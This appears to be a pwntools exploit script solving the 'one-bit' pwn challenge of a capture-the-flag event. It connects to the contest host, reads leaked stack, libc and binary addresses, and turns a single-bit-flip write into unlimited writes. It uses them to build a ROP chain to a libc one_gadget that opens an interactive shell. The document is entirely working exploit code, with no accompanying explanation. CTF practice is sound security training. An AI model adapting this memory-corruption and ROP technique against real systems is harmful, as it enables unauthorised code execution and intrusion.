from pwn import *

target = remote("pwn.ctf.secso.cc", 5003)

libc = ELF("./libc-2.31.so")
exe = ELF("./one-bit")

def send_addr(addr):
	target.recvuntil(":\n")
	target.sendline(str(addr))

# same as send_addr, but makes it clear what we're sending when
def send_bit(bit):
	target.recvuntil(":\n")
	target.sendline(str(bit))

def extract_addr(string):
	string = string[-13:-1]
	string = int(string, base=16)
	return string

def get_unlimited_writes(stack):
	# overwrite most-signifigant-bit of loop variable, which is signed, to swap its signedness
	loop_var = stack+0x29
	print("Overwriting loop variable at : " + str(hex(loop_var)))

	send_addr(loop_var)
	send_bit(31)

def ropchain(stack, exe_leak):
	#overwriting ret address and a bit beyound to classic ropchain
	ret_start = stack + 0x49
	
	p_rsi = libc.address + 0x2601f
	p_rdx = libc.address + 0x142c92
	p_rdi = libc.address + 0x23b6a
	ret = libc.address + 0x22679
	one_gadg = libc.address  + 0xe3b01


	write_what_where(ret_start, p_rsi, libc.address+0x24083)
	ret_start += 8

	write_what_where(ret_start, 0, libc.address + 0x21e5c0)
	ret_start += 8

	write_what_where(ret_start, p_rdx, stack+0x139)
	ret_start += 8

	write_what_where(ret_start, 0 , 0x0000000100000000)
	ret_start += 8

	write_what_where(ret_start, one_gadg, exe_leak - 0xfb)



def write_what_where(addr, value, origin):
	print("Overwriting address {} to value {}".format(hex(addr), hex(value)))

	for i in range(0, 64):
		if ((value & (1 << i)) != (origin & (1 << i))):
			send_addr(addr)
			send_bit(i)
			#print(target.recvline())

target.recvline()
heap_leak = extract_addr(target.recvline())
stack_leak = extract_addr(target.recvline())
libc_leak = extract_addr(target.recvline())
exe_leak = extract_addr(target.recvline())

print(hex(heap_leak))
print(hex(stack_leak))
print(hex(libc_leak))
print(hex(exe_leak))

libc.address = libc_leak - 0x61c90
exe.address = exe_leak - 0x1334
print(hex(libc.address))

get_unlimited_writes(stack_leak)

ropchain(stack_leak, exe_leak)
get_unlimited_writes(stack_leak)


target.interactive()

